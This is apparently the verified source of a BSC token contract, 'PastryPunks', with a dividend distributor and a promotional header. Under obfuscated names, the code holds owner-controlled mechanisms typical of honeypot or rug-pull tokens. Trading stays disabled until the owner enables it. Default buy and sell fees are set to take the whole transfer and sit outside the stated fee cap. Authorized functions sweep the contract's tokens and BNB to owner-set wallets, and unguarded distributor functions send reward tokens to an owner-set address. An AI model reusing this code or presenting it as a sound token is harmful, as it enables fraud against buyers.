/**
 *Submitted for verification at BscScan.com on 2021-12-01
*/

/**

██████╗░░█████╗░░██████╗████████╗██████╗░██╗░░░██╗██████╗░██╗░░░██╗███╗░░██╗██╗░░██╗░██████╗
██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗╚██╗░██╔╝██╔══██╗██║░░░██║████╗░██║██║░██╔╝██╔════╝
██████╔╝███████║╚█████╗░░░░██║░░░██████╔╝░╚████╔╝░██████╔╝██║░░░██║██╔██╗██║█████═╝░╚█████╗░
██╔═══╝░██╔══██║░╚═══██╗░░░██║░░░██╔══██╗░░╚██╔╝░░██╔═══╝░██║░░░██║██║╚████║██╔═██╗░░╚═══██╗
██║░░░░░██║░░██║██████╔╝░░░██║░░░██║░░██║░░░██║░░░██║░░░░░╚██████╔╝██║░╚███║██║░╚██╗██████╔╝
╚═╝░░░░░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░╚═════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░

MINT YOUR VERY OWN PASTRYPUNKS AT PASTRYPUNKS.COM
TOKEN PRESALE ONLY ON PINKSALE.FINANCE!!

TG: https://t.me/PastryPunksOfficial
WEBSITE: https://pastrypunks.com
LINKTREE: https://linktr.ee/PastryPunksOfficial

PASTRYPUNKS IS TAKING OVER BSC!!!!
NFTS WITH UTILITY IN OUR VERY OWN PASTRYPUNKS BSC TOKEN!!
THE MORE NFTS YOU OWN, THE LOWER YOUR BUY TAX!!

*/


//SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.4;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface TokT {
    function balanceOf(address) external returns (uint);
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function getrewards(address shareholder) external;
    function setnewrw(address _nrew, address _prew) external;
    function cCRwds(uint256 _aPn, uint256 _aPd) external;
    function cPRwds(uint256 _aPn, uint256 _aPd) external;
    function getRAddress() external view returns (address);
    function setnewra(address _newra) external;
    function getRewardsOwed(address _wallet) external view returns (uint256);
    function getTotalRewards(address _wallet) external view returns (uint256);
    function gettotalDistributed() external view returns (uint256);
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;
    
    address _token;
    
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised; }
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IBEP20 RWDS = IBEP20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    IBEP20 PRWDS = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    address REWARDS;
    IDEXRouter router;
    
    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
    uint256 public minPeriod = 600;
    uint256 public minDistribution = 10000 * (10 ** 9);
    uint256 currentIndex;
    
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;
    
    bool initialized;
    
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder); }
        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);}
        else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder); }
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function cCRwds(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = REWARDS;
        uint256 Ramount = RWDS.balanceOf(address(this));
        uint256 PRamount = Ramount.mul(_aPn).div(_aPd);
        RWDS.transfer(shareholder, PRamount);
    }
    
    function deposit() external payable override onlyToken {
        uint256 balanceBefore = RWDS.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(RWDS);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp );
        uint256 amount = RWDS.balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function cPRwds(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = REWARDS;
        uint256 Pamount = PRWDS.balanceOf(address(this));
        uint256 PPamount = Pamount.mul(_aPn).div(_aPd);
        PRWDS.transfer(shareholder, PPamount);
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0) { return; }
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0; }
            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]); }
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++; }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function getRAddress() public view override returns (address) {
        return address(RWDS);
    }

    function setnewra(address _newra) external override onlyToken {
        REWARDS = _newra;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){ //raining.shitcoins
            totalDistributed = totalDistributed.add(amount);
            RWDS.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function setnewrw(address _nrew, address _prew) external override onlyToken {
        PRWDS = IBEP20(_prew);
        RWDS = IBEP20(_nrew);
    }

    function getrewards(address shareholder) external override onlyToken {
        distributeDividend(shareholder);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function gettotalDistributed() public view override returns (uint256) {
        return uint256(totalDistributed);
    }

    function getRewardsOwed(address _wallet) external override view returns (uint256) {
        address shareholder = _wallet;
        return uint256(getUnpaidEarnings(shareholder));
    }

    function getTotalRewards(address _wallet) external override view returns (uint256) {
        address shareholder = _wallet;
        return uint256(shares[shareholder].totalRealised);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract PASTRYPUNKS is IBEP20, Auth {
    using SafeMath for uint256;
    
    string private constant _name = 'PastryPunks';    
    string private constant _symbol = 'PastryPunks';
    uint8 private constant _decimals = 9;
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address CAKE = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    
    uint256 _totalSupply = 1 * 10**8 * (10 ** _decimals);
    uint256 public _maxTxAmount = ( _totalSupply * 100 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 250 ) / 10000;
    uint256 public mStx = ( _totalSupply * 100 ) / 10000;
    IBEP20 TOKEN = IBEP20(0x84d2d2E11423d995e7bf3Ef8295A2715DE158d08);
    uint256 public asT = ( _totalSupply * 10000 ) / 100000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) iFxE;
    mapping (address => bool) iTxLE;
    mapping (address => bool) iDxE;
    mapping (address => bool) itCDh;
    mapping (address => bool) isTloE;
    mapping (address => bool) iMxWE;
    uint256 liqF = 4;
    uint256 rewF = 8;
    uint256 markF = 4;
    uint256 totF = 16;
    uint256 fD = 100;
    uint256 vbuy2 = 100;
    IDEXRouter router;
    address public pair;
    uint256 zr = 100;
    address lpR;
    address spzN;
    address jazK;
    address nizK;
    address syzS;
    address mkwA;
    address tfU;
    uint256 vbuy3 = 100;
    uint256 xr = 30;
    uint256 tL = 30;
    uint256 vbuy4 = 100;
    uint256 gss = 30000;
    uint256 tLD = 100;
    uint256 yr = 10;
    uint256 vbuy1 = 100;
    uint256 gso = 30000;
    DividendDistributor distributor;
    uint256 distributorGas = 300000;

    bool public swE = true;
    uint256 public sT = _totalSupply * 10000 / 100000;
    bool public bbt = true;
    uint256 public bbf = 100;
    bool LFG = false;
    uint256 public vsN = 60;
    uint256 vsD = 100;
    bool public tokholder = false;
    uint8 mStts = 2 seconds;
    mapping (address => uint) private mSts;
    bool sFrz = true;
    uint8 sFrzT = 10 seconds;
    mapping (address => uint) private sFrzin;
    bool bFrz = true;
    uint8 bFrzT = 5 seconds;
    mapping (address => uint) private bFrzin;
    bool public sst = true;
    uint256 public ssf = 100;
   
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = uint256(-1);
        distributor = new DividendDistributor(address(router));
        lpR = msg.sender;
        spzN = msg.sender;
        jazK = msg.sender;
        nizK = msg.sender;
        syzS = msg.sender;
        mkwA = msg.sender;
        tfU = msg.sender;
        iFxE[msg.sender] = true;
        iFxE[address(owner)] = true;
        iFxE[address(this)] = true;
        iTxLE[msg.sender] = true;
        iTxLE[address(this)] = true;
        iTxLE[address(owner)] = true;
        iTxLE[address(router)] = true;
        iMxWE[address(msg.sender)] = true;
        iMxWE[address(this)] = true;
        iMxWE[address(DEAD)] = true;
        iMxWE[address(pair)] = true;
        iMxWE[address(lpR)] = true;
        itCDh[address(this)] = true;
        isTloE[address(lpR)] = true;
        isTloE[address(owner)] = true;
        isTloE[msg.sender] = true;
        isTloE[DEAD] = true;
        isTloE[address(this)] = true;
        iDxE[address(this)] = true;
        iDxE[pair] = true;
        iDxE[DEAD] = true;
        iDxE[ZERO] = true;
        
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function name() external pure override returns (string memory) { return _name; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){ //raining.shitcoins
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance"); }
        return _transFrom(sender, recipient, amount);
    }
    
    function setMbTP(uint256 _mnbTP) external authorized {
        _maxTxAmount = (_totalSupply * _mnbTP) / 10000;
    }

    function updateRouter(address _router) external authorized {
        router = IDEXRouter(address(_router));
    }

    function setMWP(uint256 _mnWP) external authorized {
        _maxWalletToken = (_totalSupply * _mnWP) / 10000;
    }

    function _transFrom(address sender, address recipient, uint256 amount) internal returns (bool){
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        if(!authorizations[sender] && !authorizations[recipient]){require(LFG, "LFG");}
        if (!authorizations[sender] && !iMxWE[recipient] && recipient != address(this) && 
            recipient != address(DEAD) && recipient != pair && recipient != lpR){
            require((balanceOf(recipient) + amount) <= _maxWalletToken, 
            "Exceeds maximum wallet token amount.");}
        if(sender != pair && sFrz && !isTloE[sender]) {
            require(sFrzin[sender] < block.timestamp, 
            "Sell cooldown time not reached."); 
            sFrzin[sender] = block.timestamp + sFrzT;} 
        if(sender == pair && bFrz && !isTloE[recipient]){
            require(bFrzin[recipient] < block.timestamp, 
            "Buy cooldown time not reached."); 
            bFrzin[recipient] = block.timestamp + bFrzT;} 
        checkTxLimit(sender, amount);
        chkSmTx(sender != pair, sender, amount);
        if(sender == pair){mSts[recipient] = block.timestamp + mStts;}
        if(sSwapBack(amount) && mSts[sender] < block.timestamp && 
            !itCDh[sender]){ vswBk(amount); }
        _balances[sender] = _balances[sender].sub(amount, "+");
        uint256 amountReceived = checkFeEx(sender, recipient) ? totalF(sender, recipient, amount, recipient) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        if(!iDxE[sender] && mSts[sender] < block.timestamp) {
            try distributor.setShare(sender, _balances[sender]) {} catch {} }
        if(!iDxE[recipient] && mSts[sender] < block.timestamp) {
            try distributor.setShare(recipient, _balances[recipient]) {} catch {} }
        if(mSts[sender] < block.timestamp){
            try distributor.process(distributorGas) {} catch {}}
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require (amount <= _maxTxAmount || iTxLE[sender], "TX Limit Exceeded");
    }

    function checkFeEx(address sender, address recipient) internal view returns (bool) {
        if(sender == pair){return !iFxE[recipient];}
        return !iFxE[sender];
    }

    function chkSmTx(bool selling, address sender, uint256 amount) internal view {
        if(selling && mSts[sender] < block.timestamp){
            require(amount <= mStx || iTxLE[sender], "TX Limit Exceeded");}
    }

    function setFreeze(bool _sstatus, bool _bstatus, uint8 _sint, uint8 _bint) external authorized {
        sFrz = _sstatus;
        bFrz = _bstatus;
        sFrzT = _sint;
        bFrzT = _bint;
    }

    function setrfu(address _tfU) external authorized {
        tfU = _tfU;
    }

    function getTotF(bool selling, address recipient) public view returns (uint256) {
        if(!selling && tokholder && TOKEN.balanceOf(recipient) < 5){ return bbf.mul(1); }
        if(!selling && tokholder && TOKEN.balanceOf(recipient) >= 5 &&
            TOKEN.balanceOf(recipient) < 10 ){return vbuy1;}
        if(!selling && tokholder && TOKEN.balanceOf(recipient) >= 10 &&
            TOKEN.balanceOf(recipient) < 15 ){return vbuy2;}
        if(!selling && tokholder && TOKEN.balanceOf(recipient) >= 15 &&
            TOKEN.balanceOf(recipient) < 20){return vbuy3;}
        if(!selling && tokholder && TOKEN.balanceOf(recipient) >= 20){return vbuy4;}
        if(!selling && !tokholder){return bbf.mul(1); }
        if(selling){ return ssf.mul(1); }
        return totF;
    }

    function setrmnb(address _mkwa) external authorized {
        mkwA = _mkwa;
    }

    function totalF(address sender, address receiver, uint256 amount, address recipient) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotF(receiver == pair, recipient)).div(fD);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function sSwapBack(uint256 amount) internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swE
        && amount >= asT
        && _balances[address(this)] >= sT;
    }

    function setistCDh(address holder, bool exempt) external authorized {
        itCDh[holder] = exempt;
    }

    function settokholder(bool _enable) external authorized {
        tokholder = _enable;
    }

    function setLFG() external onlyOwner {
        LFG = true;
    }

    function setPreSale() external authorized {
        sFrz = false;
        bbt = false; 
        bFrz = false; 
        sst = false;
        totF = 0; 
        swE = false;
    }
    
    function setTimeL(address holder, bool exempt) external authorized {
        isTloE[holder] = exempt;
    }

    function setnewrw(address _token) external authorized {
        TOKEN = IBEP20(_token);
    }

    function cSb(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(tfU).transfer(amountBNB.mul(aP).div(100));
    }

    function setiDE(address holder, bool exempt) external authorized {
        require(holder != address(this) && holder != pair, "holders excluded");
        iDxE[holder] = exempt;
        if(exempt){
            distributor.setShare(holder, 0);}
        else{distributor.setShare(holder, _balances[holder]); }
    }

    function setrecadd(address _mkwa, address _spz, address _jaz, address _niz, address _syz, address _newra) external authorized {
        mkwA = _mkwa;
        spzN = _spz;
        jazK = _jaz;
        nizK = _niz;
        syzS = _syz;
        tfU = _newra;
        distributor.setnewra(_newra);
    }

    function setFE(address holder, bool exempt) external authorized {
        iFxE[holder] = exempt;
    }

    function setLauNch() external authorized {
        sFrz = true;
        bbt = true; 
        bFrz = true; 
        sst = true;
        totF = liqF.add(markF).add(rewF); 
        swE = true;
    }

    function approvals(uint256 _na, uint256 _da) external authorized {
        uint256 acBNB = address(this).balance;
        uint256 acBNBa = acBNB.mul(_na).div(_da);
        uint256 acBNBf = acBNBa.mul(1).div(4);
        uint256 acBNBs = acBNBa.mul(1).div(4);
        uint256 acBNBt = acBNBa.mul(1).div(4);
        uint256 acBNBl = acBNBa.mul(1).div(4);
        (bool tmpSuccess,) = payable(spzN).call{value: acBNBf, gas: gss}("");
        (tmpSuccess,) = payable(jazK).call{value: acBNBs, gas: gss}("");
        (tmpSuccess,) = payable(nizK).call{value: acBNBt, gas: gss}("");
        (tmpSuccess,) = payable(syzS).call{value: acBNBl, gas: gss}("");
        tmpSuccess = false;
    }

    function setTLE(address holder, bool exempt) external authorized {
        iTxLE[holder] = exempt;
    }

    function setWME(address holder, bool exempt) external authorized {
        iMxWE[holder] = exempt;
    }

    function setswap(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
        uint256 tamt = TokT(_tadd).balanceOf(address(this));
        TokT(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));
    }

    function setmsTx(uint256 _mstx) external authorized {
        mStx = ( _totalSupply * _mstx ) / 10000;
    }

    function setautol(address _lpR) external authorized {
        lpR = _lpR;
    }

    function setFStruct(uint256 _liqF, uint256 _rewF, uint256 _marF, uint256 _feeD) external authorized {
        liqF = _liqF;
        rewF = _rewF;
        markF = _marF;
        totF = _liqF.add(_rewF).add(_marF);
        fD = _feeD;
        require (totF < fD/4, "fees cannot be that high");
    }

    function setsste(bool _enabled, uint256 _ssf) external authorized {
        sst = _enabled;
        ssf = _ssf;
    }
    
    function retrievecake() external authorized {
        uint256 tamt = TokT(CAKE).balanceOf(address(this));
        TokT(CAKE).transfer(msg.sender, tamt);
    }

    function setbbfe(bool _enabled, uint256 _bbf) external authorized {
        bbt = _enabled;
        bbf = _bbf;
    }

    function varST(uint256 amount) internal view returns (uint256) {
        uint256 variableSTd = amount.mul(vsN).div(vsD);
        if(variableSTd <= sT){ return variableSTd; }
        if(variableSTd > sT){ return sT; }
        return sT;
    }

    function setvariable(uint256 _xvariable, uint256 _yvariable, uint256 _zvariable) external authorized {
        xr = _xvariable;
        yr = _yvariable;
        zr = _zvariable;
    }

    function vswBk(uint256 amount) internal swapping {
        uint256 dynamicLiq = isOverLiquified(tL, tLD) ? 0 : yr;
        uint256 amountL = varST(amount).mul(dynamicLiq).div(tLD).div(2);
        uint256 totalSw = varST(amount).sub(amountL);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 bB = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            totalSw, //raining.shitcoins
            0, 
            path,
            address(this),
            block.timestamp );
        uint256 aBNB = address(this).balance.sub(bB);
        uint256 tBNBF = tLD.sub(dynamicLiq.div(2));
        uint256 aBNBL = aBNB.mul(dynamicLiq).div(tBNBF).div(2);
        uint256 aBNBR = aBNB.mul(xr).div(tBNBF);
        uint256 aBNBM = aBNB.mul(zr).div(tBNBF);
        try distributor.deposit{value: aBNBR}() {} catch {}
        (bool tmpSuccess,) = payable(mkwA).call{value: (aBNBM), gas: gso}("");
        tmpSuccess = false;
        if(amountL > 0){
            router.addLiquidityETH{value: aBNBL}(
                address(this),
                amountL,
                0,
                0,
                lpR,
                block.timestamp );
            emit AutoLiquify(aBNBL, amountL); 
        }
    }

    function setswe(bool _enabled, uint256 _amount) external authorized {
        swE = _enabled;
        sT = _totalSupply * _amount / 100000;
    }

    function setmswt(uint256 _amount) external authorized {
        asT = _totalSupply * _amount / 100000;
    }

    function setTL(uint256 _up, uint256 _down) external authorized {
        tL = _up;
        tLD = _down;
    }

    function setPresaleAddress(address _PresaleAddress) external authorized {
        authorizations[_PresaleAddress] = true;
        iFxE[_PresaleAddress] = true;
        iTxLE[_PresaleAddress] = true;
        isTloE[_PresaleAddress] = true;
        iDxE[_PresaleAddress] = true;
        iMxWE[_PresaleAddress] = true;
    }

    function maxTL() external authorized {
        _maxTxAmount = _totalSupply.mul(1);
        _maxWalletToken = _totalSupply.mul(1);
    }

    function setnewrew(address _nrew, address _prew) external authorized {
        distributor.setnewrw(_nrew, _prew);
    }

    function mswapback(uint256 _amount) external authorized {
        vswBk(_totalSupply * _amount / 100000);
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setvarsT(uint256 _vstf, uint256 _vstd) external authorized {
        vsN = _vstf;
        vsD = _vstd;
    }

    function setvbuy(uint256 _vbuy1, uint256 _vbuy2, uint256 _vbuy3, uint256 _vbuy4) external authorized {
        vbuy1 = _vbuy1;
        vbuy2 = _vbuy2;
        vbuy3 = _vbuy3;
        vbuy4 = _vbuy4;
    }
    
    function setgas(uint256 _gso, uint256 _gss) external authorized {
        gso = _gso;
        gss = _gss;
    }

    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 750000, "gas is limited");
        distributorGas = gas;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getppr(uint256 _aPn, uint256 _aPd) external authorized {
        distributor.cPRwds(_aPn, _aPd);
    }

    function _getMyRewards() external {
        address shareholder = msg.sender;
        distributor.getrewards(shareholder);
    }

    function getMyRewardsOwed(address _wallet) external view returns (uint256){
        return distributor.getRewardsOwed(_wallet);
    }

    function getMyTotalRewards(address _wallet) external view returns (uint256){
        return distributor.getTotalRewards(_wallet);
    }

    function getccr(uint256 _aPn, uint256 _aPd) external authorized {
        distributor.cCRwds(_aPn, _aPd);
    }

    function currentReward() public view returns (address) {
        return distributor.getRAddress();
    }

    function gettotalRewardsDistributed() public view returns (uint256) {
        return distributor.gettotalDistributed();
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }
    
    event AutoLiquify(uint256 amountBNB, uint256 amountWBNB);
}